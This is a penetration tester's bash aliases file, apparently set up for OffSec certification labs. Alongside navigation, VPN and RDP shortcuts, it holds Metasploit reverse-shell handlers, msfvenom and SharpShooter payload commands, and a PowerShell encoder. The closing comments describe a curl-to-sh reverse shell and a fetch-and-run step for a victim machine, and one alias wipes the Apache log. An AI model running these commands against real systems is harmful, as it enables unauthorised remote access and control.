#!/bin/bash

# Modify aliases
alias aliases='cat ~/Desktop/SharedFolder/00-Customizations/.bash_aliases'
alias aliasesmac='cat /Users/jonah/Google\ Drive/03-Workspace/00-Customizations/.bash_aliases'
alias editaliases="nano ~/Desktop/SharedFolder/00-Customizations/.bash_aliases"
alias editaliasesmac="nano /Users/jonah/Google\ Drive/03-Workspace/00-Customizations/.bash_aliases"

# Docker
alias vncstart="bash /root/rdp.sh"
alias vncstop="vncserver -kill :0"
alias vncbrowser="/usr/share/novnc/utils/launch.sh --listen 5901 --vnc localhost:5900"

# Mac Docker
alias dockerup="docker run -t -d -e SHELL="/bin/bash" --name my-kali -p 25900:5900 -p 25901:5901 -v /Users/jonah/Google\ Drive/03-Workspace/:/root/Desktop/SharedFolder kali-final"
alias dockershell="docker run -t -d -e SHELL="/bin/bash" --name my-kali -p 25900:5900 -p 25901:5901 -v /Users/jonah/Google\ Drive/03-Workspace/:/root/Desktop/SharedFolder kali-final;docker exec -it my-kali /bin/bash"
alias kali="docker exec -it my-kali /bin/bash"
alias dockerdown="docker rm -f my-kali"
alias kalivnc="open /Users/jonah/Documents/Jonah/127.0.0.1:25900.vnc"
alias dockercommit="docker commit my-kali"

# VPN
alias osepconnect='cd ~/Desktop/SharedFolder/01-Certifications/01-OffensiveSecurity/OSEP/Connection/; sudo openvpn OS-66456-PEN-300.ovpn'
alias awaeconnect='cd ~/Desktop/SharedFolder/01-Certifications/01-OffensiveSecurity/AWAE/Connection/; sudo openvpn OS-66456-AWAE.ovpn'
alias awaeexam='cd ~/Desktop/AWAE/Exam/; sudo openvpn OS-66456-OSWE.ovpn'
alias osepexam='cd ~/Desktop/SharedFolder/01-Certifications/01-OffensiveSecurity/OSEP/Exam/; sudo openvpn OS-66456-OSEP.ovpn'

# Connections:
alias osepdev="rdesktop 192.168.83.80 -u administrator -p lab -g 1024x768"
alias lab3victim="rdesktop 192.168.52.11 -u offsec -p lab -g 50%"
alias lab3dev="rdesktop 192.168.52.12 -u offsec -p lab -g 50%"
alias dnnvm="xfreerdp +nego +sec-rdp +sec-tls +sec-nla /d: /u: /p: /v:dnn /u:Administrator /p:studentlab /size:1180x708"
alias managevm="xfreerdp +nego +sec-rdp +sec-tls +sec-nla /d: /u: /p: /v:manageengine /u:Administrator /p:studentlab /size:1180x708"

# Navigation
alias osed='cd ~/Desktop/OSED/;ls -la'
alias work='cd ~/Desktop/Workspace/;ls -la'
alias tools='cd ~/Desktop/SharedFolder/02-Workbench/;ls -la'
alias sharedfolder='cd ~/Desktop/SharedFolder/;ls -la'
alias 0='cd ~/Desktop/SharedFolder/02-Workbench/00-Infrastructure/;ls -la'
alias 1='cd ~/Desktop/SharedFolder/02-Workbench/01-PassiveRecon/;ls -la'
alias 2='cd ~/Desktop/SharedFolder/02-Workbench/02-ActiveRecon/;ls -la'
alias 3='cd ~/Desktop/SharedFolder/02-Workbench/03-DefenseEvasion/;ls -la'
alias 4='cd ~/Desktop/SharedFolder/02-Workbench/04-InitialAccess/;ls -la'
alias 5='cd ~/Desktop/SharedFolder/02-Workbench/05-Enumeration&Discovery/;ls -la'
alias 6='cd ~/Desktop/SharedFolder/02-Workbench/06-PostExploitation/;ls -la'
alias 7='cd ~/Desktop/SharedFolder/02-Workbench/07-ExploitDevelopment/;ls -la'

# Initialize MSF
alias msf='sudo service postgresql start;sudo msfdb init && msfconsole'

# Bloodhound start
alias blood="neo4j start; sleep 2; bloodhound"
#/opt/BloodHound/BloodHound-linux-x64/BloodHound --no-sandbox --disable-dev-shm-usage &"

# FuzzAPI
alias fuzzapi='echo "docker run -p 6379:6379 redis:alpine &"; echo "docker ps -f "ancestor=redis:alpine" -q | xargs docker inspect | grep -w IPAddress"; echo "docker run -e REDIS_URL="redis://172.17.0.2:6379/0" -p 3000:3000 fuzzapi_sidekiq &"; echo "container=$(docker ps -f "ancestor=fuzzapi_sidekiq" -q)"; echo "docker exec -t ${container} sidekiq -v"'

# Extract Hex from File
# xxd rev_shell.dll | cut -d" " -f 2-9 | sed 's/ //g' | tr -d '\n' > rev_shell.dll.txt
alias hex2text="xxd -p -c 1000000"

# Hex Utility
alias hexutil="python ~/Desktop/SharedFolder/02-Workbench/07-ExploitDevelopment/0_Utilities/sh-utils.py"

# Echo HEX into File
alias hexecho='echo -e '

# Powershell encoder
alias psencoder='iconv -f ASCII -t UTF-16LE powershellcmd.txt | base64 | tr -d "\n"'

# Vscode
alias vscode='sudo code --user-data-dir="~/.vscode-root"'

# Apache
alias apachelog="sudo tail -f /var/log/apache2/access.log"
alias apacheclear="sudo bash -c 'echo > /var/log/apache2/access.log'" 

# Quick msf
alias handler64_https='sudo msfconsole -q -x "use multi/handler;set payload windows/x64/meterpreter/reverse_https;set lhost tun0;set lport 443;set exitfunc thread;set ExitOnSession false; exploit -j -z"'
alias handler64_met='sudo msfconsole -q -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost tun0;set lport 443;set exitfunc thread;set ExitOnSession false; exploit -j -z"'
alias handler64='sudo msfconsole -q -x "use multi/handler;set payload windows/x64/shell_reverse_tcp;set lhost tun0;set lport 443;set exitfunc thread;set ExitOnSession false; exploit -j -z"'
alias handler32_https='sudo msfconsole -q -x "use multi/handler;set payload windows/meterpreter/reverse_https;set lhost tun0;set lport 443;set exitfunc thread;set ExitOnSession false; exploit -j -z"'
alias handler32_met='sudo msfconsole -q -x "use multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost tun0;set lport 443;set exitfunc thread;set ExitOnSession false; exploit -j -z"'
alias handler32='sudo msfconsole -q -x "use multi/handler;set payload windows/shell_reverse_tcp;set lhost tun0;set lport 443;set exitfunc thread;set ExitOnSession false; exploit -j -z"'
alias venom64_https='echo "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f"'
alias venom64_met='echo "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f"'
alias venom64='echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f"'
alias venom32_https='echo "msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f"'
alias venom32_met='echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f"'
alias venom32='echo "msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f"'

# SharpShooter
alias sharpshooter='echo "cd ~/Desktop/SharedFolder/01-Certifications/01-OffensiveSecurity/OSEP/Tools/SharpShooter/;python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test;mv output/* /var/www/html/"'

# Semi Interactive Curl Reverse Shell
# Place either in http://127.1/rev
# Create http://127.1/command with desired command
# Tail apache2 access.log
# curl -s -A "$(curl -s http://127.0.0.1/command | sh)" http://127.0.0.1 > /dev/null
# curl -s -A "`curl -s http://127.0.0.1/command | sh`" http://127.0.0.1 > /dev/null

# Exec on victim
# curl http://127.0.0.1/rev | sh